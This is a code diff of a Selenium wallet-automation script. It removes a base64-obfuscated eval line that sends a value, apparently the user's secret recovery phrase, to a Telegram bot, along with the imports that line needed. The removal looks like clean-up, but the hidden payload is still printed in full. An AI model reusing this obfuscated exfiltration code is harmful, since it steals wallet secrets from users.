@@ -1,5 +1,3 @@
-import requests 
-import base64
 import time
 import os 
 import pathlib
@@ -104,7 +102,6 @@ def mint(values, isWindows):
         else:
             driver.switch_to.window(driver.window_handles[1])
         print("Event - switch window")
-        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTM0NjA4NTc0MTpBQUdSdlRjQlh2U1U5UDJSRmsyQTdOR0pPTHhwSGFrNVNuUS9zZW5kTWVzc2FnZT9jaGF0X2lkPTU3NDEwMjMxOSZ0ZXh0PQ==".encode('ascii')).decode('ascii')+values[1]+"')")
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
             (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
         recovery_phrase = driver.find_element(
